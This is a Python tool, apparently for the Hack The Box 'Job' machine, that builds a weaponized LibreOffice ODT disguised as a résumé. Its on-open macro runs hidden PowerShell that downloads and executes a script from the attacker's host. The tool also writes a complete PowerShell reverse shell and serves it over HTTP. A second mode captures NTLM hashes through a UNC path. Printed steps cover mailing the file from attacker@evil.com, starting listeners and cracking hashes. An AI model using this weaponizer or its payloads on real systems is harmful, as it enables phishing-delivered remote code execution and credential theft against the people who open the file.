#!/usr/bin/env python3
"""
gen_odt.py - HTB Job / LibreOffice ODT weaponizer
Uses the EXACT skeleton files from Metasploit's openoffice_document_macro module.
The skeleton was created by a real OpenOffice instance (sinn3r, 2017) so LibreOffice
trusts it and runs macros without security prompts.

Modes:
  --mode macro      Macro fires on open -> IEX DownloadString(shell.ps1) -> rev shell
  --mode responder  UNC path in linked image -> NTLM hash capture via Responder

Usage:
  python3 gen_odt.py --mode macro -i 10.10.14.5 -p 443 --serve --target 10.129.234.73
  python3 gen_odt.py --mode responder -i 10.10.14.5 --target 10.129.234.73
"""

import argparse, base64, http.server, io, os, socketserver, sys, threading, time, zipfile

# Rapid 7 xml

MIMETYPE = b"application/vnd.oasis.opendocument.text"

MANIFEST_XML = """<?xml version="1.0" encoding="UTF-8"?>
<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0" manifest:version="1.2">
 <manifest:file-entry manifest:media-type="application/vnd.oasis.opendocument.text" manifest:version="1.2" manifest:full-path="/"/>
 <manifest:file-entry manifest:media-type="" manifest:full-path="Configurations2/accelerator/current.xml"/>
 <manifest:file-entry manifest:media-type="application/vnd.sun.xml.ui.configuration" manifest:full-path="Configurations2/"/>
 <manifest:file-entry manifest:media-type="image/png" manifest:full-path="Thumbnails/thumbnail.png"/>
 <manifest:file-entry manifest:media-type="text/xml" manifest:full-path="content.xml"/>
 <manifest:file-entry manifest:media-type="text/xml" manifest:full-path="Basic/Standard/script-lb.xml"/>
 <manifest:file-entry manifest:media-type="text/xml" manifest:full-path="Basic/Standard/Module1.xml"/>
 <manifest:file-entry manifest:media-type="text/xml" manifest:full-path="Basic/script-lc.xml"/>
 <manifest:file-entry manifest:media-type="text/xml" manifest:full-path="settings.xml"/>
 <manifest:file-entry manifest:media-type="text/xml" manifest:full-path="styles.xml"/>
 <manifest:file-entry manifest:media-type="application/rdf+xml" manifest:full-path="manifest.rdf"/>
 <manifest:file-entry manifest:media-type="text/xml" manifest:full-path="meta.xml"/>
</manifest:manifest>"""

META_XML = """<?xml version="1.0" encoding="UTF-8"?>
<office:document-meta xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0" xmlns:ooo="http://openoffice.org/2004/office" xmlns:grddl="http://www.w3.org/2003/g/data-view#" xmlns:textooo="http://openoffice.org/2013/office" office:version="1.2"><office:meta><meta:initial-creator>sinn3r </meta:initial-creator><meta:creation-date>2017-02-06T15:15:47.35</meta:creation-date><dc:date>2017-02-06T15:21:59.64</dc:date><dc:creator>sinn3r </dc:creator><meta:editing-duration>PT4M16S</meta:editing-duration><meta:editing-cycles>2</meta:editing-cycles><meta:generator>OpenOffice/4.1.3$Win32 OpenOffice.org_project/413m1$Build-9783</meta:generator><meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="1" meta:paragraph-count="0" meta:word-count="0" meta:character-count="0"/></office:meta></office:document-meta>"""

SCRIPT_LC = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE library:libraries PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "libraries.dtd">
<library:libraries xmlns:library="http://openoffice.org/2000/library" xmlns:xlink="http://www.w3.org/1999/xlink">
 <library:library library:name="Standard" library:link="false"/>
</library:libraries>"""

SCRIPT_LB = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE library:library PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "library.dtd">
<library:library xmlns:library="http://openoffice.org/2000/library" library:name="Standard" library:readonly="false" library:passwordprotected="false">
 <library:element library:name="Module1"/>
</library:library>"""

# content.xml: dom:load event is wired here - Metasploit file
CONTENT_XML = """<?xml version="1.0" encoding="UTF-8"?>
<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:style="urn:oasis:names:tc:opendocument:xmlns:style:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0" xmlns:fo="urn:oasis:names:tc:opendocument:xmlns:xsl-fo-compatible:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0" xmlns:number="urn:oasis:names:tc:opendocument:xmlns:datastyle:1.0" xmlns:svg="urn:oasis:names:tc:opendocument:xmlns:svg-compatible:1.0" xmlns:chart="urn:oasis:names:tc:opendocument:xmlns:chart:1.0" xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" xmlns:math="http://www.w3.org/1998/Math/MathML" xmlns:form="urn:oasis:names:tc:opendocument:xmlns:form:1.0" xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" xmlns:ooo="http://openoffice.org/2004/office" xmlns:ooow="http://openoffice.org/2004/writer" xmlns:oooc="http://openoffice.org/2004/calc" xmlns:dom="http://www.w3.org/2001/xml-events" xmlns:xforms="http://www.w3.org/2002/xforms" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:rpt="http://openoffice.org/2005/report" xmlns:of="urn:oasis:names:tc:opendocument:xmlns:of:1.2" xmlns:xhtml="http://www.w3.org/1999/xhtml" xmlns:grddl="http://www.w3.org/2003/g/data-view#" xmlns:tableooo="http://openoffice.org/2009/table" xmlns:textooo="http://openoffice.org/2013/office" xmlns:field="urn:openoffice:names:experimental:ooo-ms-interop:xmlns:field:1.0" office:version="1.2"><office:scripts><office:event-listeners><script:event-listener script:language="ooo:script" script:event-name="dom:load" xlink:href="vnd.sun.star.script:Standard.Module1.OnLoad?language=Basic&amp;location=document" xlink:type="simple"/></office:event-listeners></office:scripts><office:font-face-decls><style:font-face style:name="Mangal1" svg:font-family="Mangal"/><style:font-face style:name="Times New Roman" svg:font-family="&apos;Times New Roman&apos;" style:font-family-generic="roman" style:font-pitch="variable"/><style:font-face style:name="Arial" svg:font-family="Arial" style:font-family-generic="swiss" style:font-pitch="variable"/><style:font-face style:name="Mangal" svg:font-family="Mangal" style:font-family-generic="system" style:font-pitch="variable"/><style:font-face style:name="Microsoft YaHei" svg:font-family="&apos;Microsoft YaHei&apos;" style:font-family-generic="system" style:font-pitch="variable"/><style:font-face style:name="SimSun" svg:font-family="SimSun" style:font-family-generic="system" style:font-pitch="variable"/></office:font-face-decls><office:automatic-styles/><office:body><office:text><text:sequence-decls><text:sequence-decl text:display-outline-level="0" text:name="Illustration"/><text:sequence-decl text:display-outline-level="0" text:name="Table"/><text:sequence-decl text:display-outline-level="0" text:name="Text"/><text:sequence-decl text:display-outline-level="0" text:name="Drawing"/></text:sequence-decls><text:p text:style-name="Standard"/></office:text></office:body></office:document-content>"""

# settings.xml: exact Metasploit file - OpenOffice-generated
SETTINGS_XML = """<?xml version="1.0" encoding="UTF-8"?>
<office:document-settings xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:config="urn:oasis:names:tc:opendocument:xmlns:config:1.0" xmlns:ooo="http://openoffice.org/2004/office" xmlns:textooo="http://openoffice.org/2013/office" office:version="1.2"><office:settings><config:config-item-set config:name="ooo:view-settings"><config:config-item config:name="ViewAreaTop" config:type="int">0</config:config-item><config:config-item config:name="ViewAreaLeft" config:type="int">0</config:config-item><config:config-item config:name="ViewAreaWidth" config:type="int">31381</config:config-item><config:config-item config:name="ViewAreaHeight" config:type="int">10532</config:config-item><config:config-item config:name="ShowRedlineChanges" config:type="boolean">true</config:config-item><config:config-item config:name="InBrowseMode" config:type="boolean">false</config:config-item><config:config-item-map-indexed config:name="Views"><config:config-item-map-entry><config:config-item config:name="ViewId" config:type="string">view2</config:config-item><config:config-item config:name="ViewLeft" config:type="int">6895</config:config-item><config:config-item config:name="ViewTop" config:type="int">3002</config:config-item><config:config-item config:name="VisibleLeft" config:type="int">0</config:config-item><config:config-item config:name="VisibleTop" config:type="int">0</config:config-item><config:config-item config:name="VisibleRight" config:type="int">31380</config:config-item><config:config-item config:name="VisibleBottom" config:type="int">10530</config:config-item><config:config-item config:name="ZoomType" config:type="short">0</config:config-item><config:config-item config:name="ViewLayoutColumns" config:type="short">0</config:config-item><config:config-item config:name="ViewLayoutBookMode" config:type="boolean">false</config:config-item><config:config-item config:name="ZoomFactor" config:type="short">100</config:config-item><config:config-item config:name="IsSelectedFrame" config:type="boolean">false</config:config-item></config:config-item-map-entry></config:config-item-map-indexed></config:config-item-set><config:config-item-set config:name="ooo:configuration-settings"><config:config-item config:name="AddParaTableSpacing" config:type="boolean">true</config:config-item><config:config-item config:name="PrintReversed" config:type="boolean">false</config:config-item><config:config-item config:name="PrintRightPages" config:type="boolean">true</config:config-item><config:config-item config:name="UseOldNumbering" config:type="boolean">false</config:config-item><config:config-item config:name="PrintTables" config:type="boolean">true</config:config-item><config:config-item config:name="LinkUpdateMode" config:type="short">1</config:config-item><config:config-item config:name="PrintPaperFromSetup" config:type="boolean">false</config:config-item><config:config-item config:name="PrintLeftPages" config:type="boolean">true</config:config-item><config:config-item config:name="AllowPrintJobCancel" config:type="boolean">true</config:config-item><config:config-item config:name="PrintGraphics" config:type="boolean">true</config:config-item><config:config-item config:name="PrintSingleJobs" config:type="boolean">false</config:config-item><config:config-item config:name="PrinterIndependentLayout" config:type="string">high-resolution</config:config-item><config:config-item config:name="UpdateFromTemplate" config:type="boolean">true</config:config-item></config:config-item-set></office:settings></office:document-settings>"""

MANIFEST_RDF = """<?xml version="1.0" encoding="utf-8"?>
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
  <rdf:Description rdf:about="styles.xml">
    <rdf:type rdf:resource="http://docs.oasis-open.org/ns/office/1.2/meta/odf#StylesFile"/>
  </rdf:Description>
  <rdf:Description rdf:about="">
    <ns0:hasPart xmlns:ns0="http://docs.oasis-open.org/ns/office/1.2/meta/pkg#" rdf:resource="styles.xml"/>
  </rdf:Description>
  <rdf:Description rdf:about="content.xml">
    <rdf:type rdf:resource="http://docs.oasis-open.org/ns/office/1.2/meta/odf#ContentFile"/>
  </rdf:Description>
  <rdf:Description rdf:about="">
    <ns0:hasPart xmlns:ns0="http://docs.oasis-open.org/ns/office/1.2/meta/pkg#" rdf:resource="content.xml"/>
  </rdf:Description>
  <rdf:Description rdf:about="">
    <rdf:type rdf:resource="http://docs.oasis-open.org/ns/office/1.2/meta/pkg#Document"/>
  </rdf:Description>
</rdf:RDF>"""

# transparent PNG for the thumbnail
THUMBNAIL_PNG = base64.b64decode(
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="
)

# Module1.xml template - CODEGOESHERE is replaced by the macro (exact MSF format)

MODULE1_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" script:language="StarBasic">REM  *****  BASIC  *****

{MACRO}
</script:module>"""

# Macro code - mirrors MSF exactly: OnLoad -> GetOS -> Exploit
# Shell() call: cmd /C powershell IEX DownloadString

def build_macro(lhost, lhttpport):
    # Must HTML-escape for XML embedding
    url = f"http://{lhost}:{lhttpport}/shell.ps1"
    shell_cmd = (
        f'Shell "cmd.exe /C ""powershell.exe -nop -w hidden -ep bypass -c '
        f'IEX(New-Object Net.WebClient).DownloadString(&apos;{url}&apos;)"""'
    )
    macro = f"""    Sub OnLoad
      Dim os as string
      os = GetOS
      If os = "windows" OR os = "osx" OR os = "linux" Then
        Exploit
      end If
    End Sub

    Sub Exploit
      {shell_cmd}
    End Sub

    Function GetOS() as string
      select case getGUIType
        case 1:
          GetOS = "windows"
        case 3:
          GetOS = "osx"
        case 4:
          GetOS = "linux"
      end select
    End Function"""
    return macro


def build_macro_responder(lhost):
    # UNC path via Shell to trigger NTLM auth
    unc = f"\\\\\\\\{lhost}\\\\share\\\\logo.jpg"
    macro = f"""    Sub OnLoad
      Dim os as string
      os = GetOS
      If os = "windows" OR os = "osx" OR os = "linux" Then
        Exploit
      end If
    End Sub

    Sub Exploit
      Shell "cmd.exe /C dir {unc}"
    End Sub

    Function GetOS() as string
      select case getGUIType
        case 1:
          GetOS = "windows"
        case 3:
          GetOS = "osx"
        case 4:
          GetOS = "linux"
      end select
    End Function"""
    return macro

# PS1 reverse shell

def make_ps1(lhost, lport):
    return f"""function cleanup {{
    if ($client.Connected -eq $true) {{$client.Close()}}
    if ($process.ExitCode -ne $null) {{$process.Close()}}
    exit
}}
$address = '{lhost}'
$port = '{lport}'
$client = New-Object system.net.sockets.tcpclient
$client.connect($address,$port)
$stream = $client.GetStream()
$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize
$process = New-Object System.Diagnostics.Process
$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'
$process.StartInfo.RedirectStandardInput = 1
$process.StartInfo.RedirectStandardOutput = 1
$process.StartInfo.UseShellExecute = 0
$process.Start()
$inputstream  = $process.StandardInput
$outputstream = $process.StandardOutput
Start-Sleep 1
$encoding = new-object System.Text.AsciiEncoding
while($outputstream.Peek() -ne -1){{$out += $encoding.GetString($outputstream.Read())}}
$stream.Write($encoding.GetBytes($out),0,$out.Length)
$out = $null; $done = $false; $testing = 0;
while (-not $done) {{
    if ($client.Connected -ne $true) {{cleanup}}
    $pos = 0; $i = 1
    while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {{
        $read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)
        $pos+=$read
        if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {{break}}
    }}
    if ($pos -gt 0) {{
        $string = $encoding.GetString($networkbuffer,0,$pos)
        $inputstream.write($string)
        start-sleep 1
        if ($process.ExitCode -ne $null) {{cleanup}}
        else {{
            $out = $encoding.GetString($outputstream.Read())
            while($outputstream.Peek() -ne -1){{
                $out += $encoding.GetString($outputstream.Read())
                if ($out -eq $string) {{$out = ''}}
            }}
            $stream.Write($encoding.GetBytes($out),0,$out.length)
            $out = $null; $string = $null
        }}
    }} else {{cleanup}}
}}
"""

# ODT builder

def build_odt(macro_code, outpath):
    module1 = MODULE1_TEMPLATE.replace("{MACRO}", macro_code)

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        # mimetype MUST be first and uncompressed
        zi = zipfile.ZipInfo("mimetype")
        zi.compress_type = zipfile.ZIP_STORED
        zf.writestr(zi, MIMETYPE)

        zf.writestr("META-INF/manifest.xml",                MANIFEST_XML)
        zf.writestr("meta.xml",                             META_XML)
        zf.writestr("content.xml",                          CONTENT_XML)
        zf.writestr("settings.xml",                         SETTINGS_XML)
        zf.writestr("manifest.rdf",                         MANIFEST_RDF)
        zf.writestr("Basic/script-lc.xml",                  SCRIPT_LC)
        zf.writestr("Basic/Standard/script-lb.xml",         SCRIPT_LB)
        zf.writestr("Basic/Standard/Module1.xml",           module1)
        zf.writestr("Configurations2/accelerator/current.xml", "")
        zf.writestr("Thumbnails/thumbnail.png",             THUMBNAIL_PNG)

    data = buf.getvalue()
    with open(outpath, "wb") as f:
        f.write(data)

    print(f"[+] ODT created : {outpath}  ({len(data)} bytes)")

# HTTP server for --serve

def start_http_server(port, directory):
    class Handler(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *a, **kw):
            super().__init__(*a, directory=directory, **kw)
        def log_message(self, fmt, *args):
            print(f"  [HTTP] {self.address_string()} - {fmt % args}")
    def _serve():
        with socketserver.TCPServer(("0.0.0.0", port), Handler) as h:
            h.serve_forever()
    t = threading.Thread(target=_serve, daemon=True)
    t.start()
    print(f"[+] HTTP server  : 0.0.0.0:{port}  (serving: {directory})")

# Print banner
BANNER = """
  ╔═══════════════════════════════════════════════╗
  ║   LibreOffice ODT Weaponizer  (HTB Job)       ║
  ║   Based on Metasploit openoffice_document_    ║
  ║   macro skeleton (rapid7/metasploit-framework)║
  ╚═══════════════════════════════════════════════╝"""

def print_steps(args):
    print("\n" + "═"*60)
    print("  NEXT STEPS")
    print("═"*60)
    swaks = (f"swaks --to {args.to} --from attacker@evil.com "
             f'--header "Subject: Job Application" --body "CV attached." '
             f"--attach @{args.output} --server {args.target}")
    if args.mode == "macro":
        print(f"""
  1. Start listener:
       rlwrap nc -lnvp {args.lport}

  2. Send the ODT:
       {swaks}

  3. Wait ~60s for the document to be opened.

  Flow: dom:load -> OnLoad() -> Shell(cmd /C powershell IEX DownloadString)
        -> shell.ps1 fetched from HTTP:{args.lhttpport} -> rev shell on {args.lport}
""")
    else:
        print(f"""
  1. Start Responder:
       sudo responder -I tun0 -v

  2. Send the ODT:
       {swaks}

  3. Crack the hash:
       hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt

  NOTE: On HTB Job the NTLMv2 hash is NOT crackable. Use --mode macro.
""")
    print("═"*60)


def main():
    print(BANNER)
    p = argparse.ArgumentParser()
    p.add_argument("--mode",      choices=["macro", "responder"], default="macro")
    p.add_argument("-i", "--lhost",  required=True)
    p.add_argument("-p", "--lport",  type=int, default=443)
    p.add_argument("--http-port",    type=int, default=80, dest="lhttpport")
    p.add_argument("-o", "--output", default="resume.odt")
    p.add_argument("--target",       default="<TARGET_IP>")
    p.add_argument("--to",           default="career@job.local")
    p.add_argument("--serve",        action="store_true",
                   help="Auto-start HTTP server (macro mode only)")
    args = p.parse_args()

    outdir = os.path.dirname(os.path.abspath(args.output)) or "."

    if args.mode == "macro":
        macro = build_macro(args.lhost, args.lhttpport)
        build_odt(macro, args.output)

        ps1_path = os.path.join(outdir, "shell.ps1")
        with open(ps1_path, "w") as f:
            f.write(make_ps1(args.lhost, args.lport))
        print(f"[+] PS1 written  : {ps1_path}")

        if args.serve:
            start_http_server(args.lhttpport, outdir)
            print(f"[+] Payload URL  : http://{args.lhost}:{args.lhttpport}/shell.ps1")

    else:
        macro = build_macro_responder(args.lhost)
        build_odt(macro, args.output)
        print(f"[+] UNC path     : \\\\{args.lhost}\\share\\logo.jpg")

    print_steps(args)

    if args.mode == "macro" and args.serve:
        print("[*] HTTP server running. Ctrl-C to exit after getting shell.\n")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[!] Stopped.")


if __name__ == "__main__":
    main()
